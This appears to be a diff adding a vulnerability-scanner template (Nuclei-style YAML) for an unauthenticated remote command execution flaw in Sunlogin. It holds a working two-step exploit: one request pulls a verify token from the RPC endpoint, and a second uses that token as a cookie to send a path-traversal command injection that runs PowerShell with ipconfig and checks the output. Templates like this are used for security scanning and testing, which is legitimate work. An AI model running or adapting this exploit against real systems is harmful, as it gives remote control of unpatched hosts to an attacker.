@@ -1,0 +1,46 @@
+id: poc-yaml-oray-sunlogin-rpc-rce
+info:
+  name: Sunlogin RPC Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+flow: http(1) && http(2)
+
+http:
+  - id: verify-haras
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/rpc?action=verify-haras"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"verify_string\""
+    extractors:
+      - type: regex
+        name: cid
+        part: body
+        internal: true
+        regex:
+          - "\"verify_string\":\"(?P<cid>.+?)\""
+
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig"
+    headers:
+      Cookie: "CID={{cid}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Windows IP"
